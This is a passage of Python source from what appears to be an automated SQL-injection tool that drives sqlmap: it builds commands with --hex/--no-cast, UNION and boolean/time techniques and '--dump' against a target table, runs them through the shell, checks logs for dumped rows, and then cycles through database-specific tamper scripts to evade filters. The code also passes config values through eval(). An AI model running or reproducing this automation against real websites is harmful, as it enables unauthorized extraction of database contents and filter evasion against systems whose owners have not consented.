                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                if self.has_good_sqli_type == 1:
                    sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
                        " --technique=USE" + " -T " + table_name + " --dump --stop 3"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                        current_finished_command_list.append(sm_hex_or_no_cast_command)
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_entries = self.get_entries_from_log_file(self.log_file)
                        if has_entries == 1:
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'bypassed_command', [sm_hex_or_no_cast_command])
                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名的具体数据" %
                                                   hex_or_no_cast, 'red')
                            return 1

                sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
                    " --technique=BQT" + " -T " + table_name + " --dump --stop 3"
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                    current_finished_command_list.append(sm_hex_or_no_cast_command)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    has_entries = self.get_entries_from_log_file(self.log_file)
                    if has_entries == 1:
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'bypassed_command', [sm_hex_or_no_cast_command])
                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名的具体数据" %
                                               hex_or_no_cast, 'red')
                        return 1

            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表的列名的具体数据...", 'green')
            # 在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
            # 先判断返回是否为0
            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
            if db_type == 'MYSQL':
                db_type_tamper_list = self.MYSQL
            elif db_type == 'MSSQL':
                db_type_tamper_list = self.MSSQL
            elif db_type == 'ORACLE':
                db_type_tamper_list = self.ORACLE
            elif db_type == 'ACCESS':
                db_type_tamper_list = self.ACCESS
            elif db_type == 'SQLITE':
                db_type_tamper_list = self.SQLITE
            elif db_type == 'PGSQL':
                db_type_tamper_list = self.PGSQL
            elif db_type == 'DB2':
                db_type_tamper_list = self.DB2
            elif db_type == 'FIREBIRD':
                db_type_tamper_list = self.FIREBIRD
            elif db_type == 'MAXDB':
                db_type_tamper_list = self.MAXDB
            elif db_type == 'SYBASE':
                db_type_tamper_list = self.SYBASE
            elif db_type == 'HSQLDB':
                db_type_tamper_list = self.HSQLDB
            else:
                print("impossile! check get_entries_need_tamper func ")

            # 下面为了得到当前url的数据库的表的列名的具体数据而进行run_all_comb
            make_it = self.run_all_comb(db_type_tamper_list, 'entries')
            if make_it == 1:
                # 下面代表已经获取了有table_name对应的tamper
                return 1

            # 下面代表尝试完当前的动作依然没有得到当前url的数据库的表的列名的具体数据
            return 0

    def check_log_has_content(self, log_file):
        # 检测log_file是否为空
        if os.path.exists(log_file) == False:
            print("log_file not exists")
            return False
        with open(log_file, "r+") as f:
            log_content = f.read()
        if len(log_content) != 0:
            return True
        else:
            return False

if __name__ == '__main__':
    Program()
